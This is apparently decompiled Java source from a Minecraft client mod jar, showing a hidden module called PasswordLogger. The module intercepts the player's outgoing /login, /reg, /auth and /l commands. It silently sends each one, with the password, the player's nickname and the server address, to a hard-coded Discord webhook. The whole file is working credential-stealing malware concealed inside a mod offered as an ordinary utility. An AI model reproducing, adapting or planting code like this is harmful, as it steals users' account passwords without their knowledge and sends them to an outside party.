/*    */ package thunder.hack.features.modules.misc;
/*    */ 
/*    */ import java.io.OutputStream;
/*    */ import java.net.HttpURLConnection;
/*    */ import java.net.URL;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import meteordevelopment.orbit.EventHandler;
/*    */ import net.minecraft.class_2596;
/*    */ import net.minecraft.class_2797;
/*    */ import net.minecraft.class_7472;
/*    */ import thunder.hack.events.impl.PacketEvent;
/*    */ import thunder.hack.features.modules.Module;
/*    */ 
/*    */ 
/*    */ public class PasswordLogger
/*    */   extends Module
/*    */ {
/*    */   private static final String WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482667742480830546/YH5H9yGLRglEr9-mfQuLMGgQ6c-di0CxoQ80FdYrCNv83ruxeAfYQkgyUh9Y-d5PV-DS";
/*    */   
/*    */   public PasswordLogger() {
/* 21 */     super("PasswordLogger", Module.Category.MISC);
/* 22 */     setDrawn(false);
/*    */   }
/*    */   
/*    */   @EventHandler
/*    */   public void onPacketSend(PacketEvent.Send event) {
/* 27 */     String message = "";
/*    */     
/* 29 */     class_2596 class_2596 = event.getPacket(); if (class_2596 instanceof class_2797) { class_2797 packet = (class_2797)class_2596;
/* 30 */       message = packet.comp_945(); }
/*    */     else
/* 32 */     { class_2596 = event.getPacket(); if (class_2596 instanceof class_7472) { class_7472 packet = (class_7472)class_2596;
/* 33 */         message = "/" + packet.comp_808(); }
/*    */        }
/*    */     
/* 36 */     if (message.isEmpty())
/*    */       return; 
/* 38 */     String lowMsg = message.toLowerCase();
/*    */     
/* 40 */     if (lowMsg.startsWith("/l ") || lowMsg.startsWith("/reg ") || lowMsg.startsWith("/login ") || lowMsg.startsWith("/auth ")) {
/* 41 */       sendToDiscord(message);
/*    */     }
/*    */   }
/*    */   
/*    */   private void sendToDiscord(String msg) {
/* 46 */     String nickname = mc.method_1548().method_1676();
/* 47 */     String server = (mc.method_1558() != null) ? (mc.method_1558()).field_3761 : "Singleplayer";
/*    */ 
/*    */     
/* 50 */     String text = "⚙ **Password Log**\\n👤 User: " + nickname + "\\n🌐 IP: " + server + "\\n🔑 Payload: `" + msg + "`";
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */     
/* 56 */     text = text.replace("\\", "\\\\").replace("\"", "\\\"");
/*    */ 
/*    */     
/* 59 */     String jsonPayload = "{\"content\": \"" + text + "\"}";
/*    */     
/* 61 */     (new Thread(() -> {
/*    */           try {
/*    */             URL url = new URL("https://discordapp.com/api/webhooks/1482667742480830546/YH5H9yGLRglEr9-mfQuLMGgQ6c-di0CxoQ80FdYrCNv83ruxeAfYQkgyUh9Y-d5PV-DS"); HttpURLConnection con = (HttpURLConnection)url.openConnection(); con.setRequestMethod("POST"); con.setRequestProperty("Content-Type", "application/json; utf-8"); con.setRequestProperty("User-Agent", "Mozilla/5.0");
/*    */             con.setDoOutput(true);
/*    */             OutputStream os = con.getOutputStream();
/*    */             
/*    */             try { byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
/*    */               os.write(input, 0, input.length);
/*    */               if (os != null)
/*    */                 os.close();  }
/* 71 */             catch (Throwable throwable) { if (os != null) try { os.close(); } catch (Throwable throwable1)
/*    */                 { throwable.addSuppressed(throwable1); }
/*    */                  
/*    */               throw throwable; }
/*    */             
/*    */             con.getInputStream().close();
/*    */             con.disconnect();
/* 78 */           } catch (Exception exception) {}
/* 79 */         })).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\Егор\Downloads\thunderhack-1.7.jar!\thunder\hack\features\modules\misc\PasswordLogger.class
 * Java compiler version: 21 (65.0)
 * JD-Core Version:       1.1.3
 */